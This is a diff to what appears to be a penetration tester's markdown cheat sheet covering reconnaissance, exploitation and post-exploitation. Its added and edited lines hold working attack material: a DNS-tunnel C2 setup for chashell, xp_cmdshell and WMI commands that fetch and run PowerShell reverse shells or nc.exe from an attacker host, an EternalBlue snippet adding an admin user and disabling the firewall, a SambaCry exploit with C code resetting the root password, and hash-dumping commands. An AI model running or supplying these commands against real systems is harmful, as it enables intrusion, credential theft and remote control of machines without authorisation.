@@ -141,6 +141,15 @@ user@remote:$ export TERM=xterm
 
 * [https://github.com/sysdream/chashell](https://github.com/sysdream/chashell)
 
+Buy and configure DNS (e.g., `c2cdomain.net`):
+
+```
+A * -> <IP>
+A @ -> <IP>
+A chashell -> <IP>
+NS c -> chashell.c2cdomain.net
+```
+
 Get dependencies:
 
 ```
@@ -163,7 +172,7 @@ Build binaries:
 
 ```
 $ export ENCRYPTION_KEY=$(python -c 'from os import urandom; print(urandom(32).encode("hex"))')
-$ export DOMAIN_NAME=c.igsbmmyvulmr.ru
+$ export DOMAIN_NAME=c.c2cdomain.net
 $ make build-all OSARCH="linux/amd64"
 ```
 
@@ -397,6 +406,13 @@ msf > irb
 
 # SMB
 
+Check for SMB vulnerablities with Nmap NSE:
+
+```
+$ sudo nmap -sV --script-args=unsafe=1 --script=smb-os-discovery 10.10.13.37 -p139,445
+$ sudo nmap -n -Pn -sV --script='smb-vuln*' 10.10.13.37 -p445
+```
+
 
 
 
@@ -485,6 +501,49 @@ $ sudo nmap -sV --script='nfs*' 10.10.10.0/24 -p111
 ```
 $ showmount -e 10.10.13.37
 $ sudo mount -v -t nfs -o vers=3 -o nolock -o user=snovvcrash,[pass='Passw0rd!'] 10.10.13.37:/home /mnt/nfs
+```
+
+
+# TFTP
+
+Enum with Nmap NSE:
+
+```
+$ sudo nmap -sU -p69 --script tftp-enum 10.10.13.37
+```
+
+## Brute Force Filenames
+
+Make a list of potential filenames. Use 8.3 notation:
+
+```
+PS > cmd /c dir /x
+PS > cmd /c "for %I in (.) do @echo %~sI"
+```
+
+Download Python TFTP implementation and use the Bash script below:
+
+* [https://github.com/m4tx/pyTFTP](https://github.com/m4tx/pyTFTP)
+
+```
+$ git clone https://github.com/m4tx/pyTFTP && cd pyTFTP
+$ ./tftp-brute.sh 10.10.13.37 files.txt
+```
+
+```bash
+#!/usr/bin/env bash
+
+IP=$1
+FILES=$2
+
+while IFS= read -r file; do
+	echo -n "[*] Trying ${file}... "
+	if ./client.py -g "${file}" "${IP}" > /dev/null 2>&1; then
+		echo "SUCCESS"
+	else
+		echo "FAIL"
+	fi
+done < "${FILES}"
 ```
 
 
@@ -1941,7 +2000,7 @@ PS > Get-WmiObject -Credential $cred -ComputerName PC01 -Namespace "root" -class
 Execute commands:
 
 ```
-PS > Invoke-WmiMethod -Credential $cred -ComputerName PC01 win32_process -Name Create -ArgumentList ("powershell IEX(New-Object Net.WebClient).DownloadFile('http://10.10.13.37/nc.exe', 'C:\Users\bob\music\nc.exe')")
+PS > Invoke-WmiMethod -Credential $cred -ComputerName PC01 win32_process -Name Create -ArgumentList ("powershell (New-Object Net.WebClient).DownloadFile('http://10.10.13.37/nc.exe', 'C:\Users\bob\music\nc.exe')")
 PS > Invoke-WmiMethod -Credential $cred -ComputerName PC01 win32_process -Name Create -ArgumentList ("C:\Users\bob\music\nc.exe 10.10.13.37 1337 -e powershell")
 ```
 
@@ -2030,7 +2089,7 @@ meterpreter > lsa_dump_secrets
 
 
 
-## NTDS
+## ntds.dit
 
 Locate `diskshadow.exe`:
 
@@ -2118,6 +2177,19 @@ Parse secrets:
 
 ```
 $ secretsdump.py -sam sam.hive -system system.hive -security security.hive -ntds ntds.dit LOCAL
+```
+
+
+
+
+## master.mdf
+
+* [https://xpnsec.tumblr.com/post/145350063196/reading-mdf-hashes-with-powershell](https://xpnsec.tumblr.com/post/145350063196/reading-mdf-hashes-with-powershell)
+* [https://github.com/xpn/Powershell-PostExploitation/tree/master/Invoke-MDFHashes](https://github.com/xpn/Powershell-PostExploitation/tree/master/Invoke-MDFHashes)
+* [https://www.nucleustechnologies.com/blog/mdf-file-location-in-sql-server-2014-2016-2017/](https://www.nucleustechnologies.com/blog/mdf-file-location-in-sql-server-2014-2016-2017/)
+
+```
+PS > Get-MDFHashes -mdf C:\Invoke-MDFHashes\master.mdf
 ```
 
 
@@ -3464,7 +3536,7 @@ $ python3 odat.py tnspoison -s 10.10.13.37 -d CLREXTPROC --poison
 2> GO
 1> RECONFIGURE
 2> GO
-1> xp_cmdshell 'whoami'
+1> xp_cmdshell whoami
 2> GO
 ```
 
@@ -3474,7 +3546,7 @@ $ python3 odat.py tnspoison -s 10.10.13.37 -d CLREXTPROC --poison
 
 ```
 $ sqsh -S 127.0.0.1 -U 'MEGACORP\snovvcrash' -P 'Passw0rd!'
-1> xp_cmdshell "powershell -nop -exec bypass IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.234/shell.ps1')"
+1> xp_cmdshell "powershell -nop -exec bypass IEX(New-Object Net.WebClient).DownloadString('http://10.10.13.37/rev.ps1')"
 2> GO
 ```
 
@@ -3484,7 +3556,7 @@ $ sqsh -S 127.0.0.1 -U 'MEGACORP\snovvcrash' -P 'Passw0rd!'
 
 ```
 $ mssqlclient.py MEGACORP/snovvcrash:'Passw0rd!'@127.0.0.1 [-windows-auth]
-SQL> xp_cmdshell "powershell -nop -exec bypass IEX(New-Object Net.WebClient).DownloadString(\"http://10.10.14.234/shell.ps1\")"
+SQL> xp_cmdshell "powershell -nop -exec bypass IEX(New-Object Net.WebClient).DownloadString(\"http://10.10.13.37/rev.ps1\")"
 ```
 
 
@@ -4365,28 +4437,39 @@ $ parsenmap.py -i services/alltcp-versions.xml
 
 ### Tricks
 
-Grep only numbers to get list of ports separated by comma:
+Grep only numbers to get a comma-separated list of ports:
 
 ```
-$ cat nmap/initial.nmap |egrep -o '^[0-9]{1,5}' |awk -F/ '{ print $1 }' ORS=','; echo
+$ cat nmap/initial.nmap | egrep -o '^[0-9]{1,5}' | awk -F/ '{ print $1 }' ORS=','; echo
 ```
 
-Fast port discovery (Masscan) + versions and NSE scripts (Nmap):
+Fast port discovery with Masscan + versions and scripts with Nmap:
 
 ```
-$ masscan --rate=1000 -e tun0 -p0-65535,U:0-65535 127.0.0.1 > ports
-$ ports=`cat ports | awk -F " " '{print $4}' | awk -F "/" '{print $1}' | sort -n | tr "\n" ',' | sed 's/,$//'`
-$ nmap -n -Pn -sV -sC [-sT] [--reason] -oA nmap/output 127.0.0.1 -p$ports
-$ rm ports
+$ sudo masscan --rate=1000 -e tun0 -p0-65535 127.0.0.1 > masscan/ports
+$ ports=`cat masscan/ports | awk -F " " '{print $4}' | awk -F "/" '{print $1}' | sort -n | tr "\n" ',' | sed 's/,$//'`
+$ sudo nmap -n -Pn -sVC [-sT] [--reason] -oA nmap/tcp 127.0.0.1 -p$ports
 ```
 
-Fast port discovery (Nmap) + versions and NSE scripts (Nmap):
+Fast port discovery with Nmap + versions and scripts with Nmap (TCP & UDP):
 
 ```
-$ nmap -n -Pn --min-rate=1000 -T4 127.0.0.1 -p- -vvv | tee ports
-$ ports=`cat ports | grep '^[0-9]' | awk -F "/" '{print $1}' | tr "\n" ',' | sed 's/,$//'`
-$ nmap -n -Pn -sV -sC [-sT] [--reason] -oA nmap/output 127.0.0.1 -p$ports
-$ rm ports
+$ sudo nmap -n -Pn --min-rate 1000 -T4 127.0.0.1 -p- -v --open | tee nmap/ports_tcp
+$ ports_tcp=`cat nmap/ports_tcp | grep '^[0-9]' | awk -F "/" '{print $1}' | tr "\n" ',' | sed 's/,$//'`
+$ sudo nmap -n -Pn -sVC [-sT] [--reason] -oA nmap/tcp 127.0.0.1 -p$ports_tcp
+
+$ sudo nmap -n -Pn -sU [--max-retries 1] 127.0.0.1 -v --open | tee nmap/ports_udp
+$ ports_udp=`cat nmap/ports_udp | grep '^[0-9]' | awk -F "/" '{print $1}' | tr "\n" ',' | sed 's/,$//'`
+$ sudo nmap -n -Pn -sVCU [--reason] -oA nmap/udp 127.0.0.1 -p$ports_udp
+```
+
+Search for Nmap NSE scripts:
+
+```
+$ find /usr/share/nmap/scripts/ -type f | grep smb
+Or
+$ sudo nmap --script-updatedb
+$ cat /usr/share/nmap/scripts/scripts.db | grep smb
 ```
 
 Top TCP ports:
@@ -4554,14 +4637,7 @@ msf > use auxiliary/scanner/netbios/nbname
 
 
 
-## LHF Checkers & Exploits
-
-Check for SMB vulnerablities with NSE:
-
-```
-$ sudo nmap -sV --script-args=unsafe=1 --script=smb-os-discovery 10.10.13.37 -p139,445
-$ sudo nmap -n -Pn -sV --script='smb-vuln*' 10.10.13.37 -p445
-```
+## LHF
 
 
 
@@ -4621,7 +4697,7 @@ $ msfvenom -p windows/shell_reverse_tcp LHOST=10.10.13.37 LPORT=443 EXITFUNC=thr
 $ python send_and_execute.py 10.10.13.38 rev.exe
 ```
 
-Or just execute some commands on the host with `zzz_exploit.py`:
+Or just execute commands on host with `zzz_exploit.py`:
 
 ```python
 def smb_pwn(conn, arch):
@@ -4629,6 +4705,41 @@ def smb_pwn(conn, arch):
 	service_exec(conn, r'cmd /c net user snovvcrash Passw0rd! /add')
 	service_exec(conn, r'cmd /c net localgroup administrators snovvcrash /add')
 	service_exec(conn, r'cmd /c netsh firewall set opmode disable')
+```
+
+
+
+### SambaCry
+
+* [https://github.com/joxeankoret/CVE-2017-7494](https://github.com/joxeankoret/CVE-2017-7494)
+
+Compile `.so` SUID shared library:
+
+```c
+// gcc -shared -fPIC -o pwn.so pwn.c
+
+#include <stdio.h>
+#include <stdlib.h>
+
+static void pwn() __attribute__((constructor));
+
+void pwn() {
+	setresuid(0,0,0);
+	system("echo 'root:Passw0rd!'|chpasswd");
+}
+```
+
+Get real share path on the target's filesystem:
+
+```
+$ rpcclient -U'%' -c'netsharegetinfo ShareName' 10.10.13.37
+path:    /home/snovvcrash/sharename
+```
+
+Upload `pwn.so` to target and then run the exploit:
+
+```
+$ ./exploit.py -t 10.10.13.37 -e pwn.so -s ShareName -r /home/snovvcrash/sharename/pwn.so -u anonymous -p ''
 ```
 
 
@@ -4641,7 +4752,7 @@ def smb_pwn(conn, arch):
 #### Check
 
 ```
-msf > use auxiliary/scanner/rdp/cve_2019_0708_bluekeep_rce
+msf > use auxiliary/scanner/rdp/cve_2019_0708_bluekeep
 ```
 
 
